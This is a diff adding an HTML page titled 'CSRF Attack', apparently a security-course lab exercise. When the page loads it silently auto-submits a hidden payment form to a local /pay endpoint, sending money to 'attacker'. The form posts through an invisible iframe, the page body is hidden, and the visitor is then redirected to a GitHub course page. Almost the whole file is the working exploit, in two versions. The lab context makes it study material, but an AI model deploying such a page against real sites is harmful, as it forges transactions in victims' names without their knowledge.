@@ -1,0 +1,77 @@
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+    <style>
+        #hidden_iframe {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe name="hidden_iframe" id="hidden_iframe"></iframe>
+
+    <form action="http://localhost:8080/pay" method="post" name="csrf-form">
+        <input type="hidden" name="recipient" value="attacker" />
+        <input type="hidden" name="amount" value="10" />
+        <input type="submit" value="Pay" />
+    </form>
+</body>
+
+<script>
+    window.onload = function() {
+        document.forms["csrf-form"].submit();
+        document.getElementById('hidden_iframe').onload = function() {
+            console.log("testing the redirect");
+            window.location.href = "https://github.com/tomrist/cs5435-spring2024";
+        };
+    };
+</script>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+    <style>
+        /* Hide everything by default */
+        body {
+            visibility: hidden;
+        }
+        /* Show only during payment completion */
+    </style>
+    <!-- <style>
+        /* This makes the iframe invisible */
+        #hidden_iframe {
+            display: none;
+        }
+    </style> -->
+</head>
+<body>    
+    <!-- Invisible iframe to handle form submission -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none;"></iframe>
+
+    <!-- Payment form -->
+    <form action="http://localhost:8080/pay" method="post" name="csrf-form" target="hidden_iframe">
+        <input type="hidden" name="recipient" value="attacker" />
+        <input type="hidden" name="amount" value="10" />
+        <input type="submit" value="Pay" />
+    </form>
+
+    <!-- JavaScript to handle redirection -->
+    <script>
+        window.onload = function() {
+            // Submit the form when the page loads
+            document.forms["csrf-form"].submit();
+
+            // Listen for the load event on the iframe
+            document.getElementById('hidden_iframe').onload = function() {
+                // When the iframe loads, redirect to the GitHub page
+                window.location.href = "https://github.com/tomrist/cs5435-spring2024";
+            };
+        };
+    </script>
+</body>
+</html>
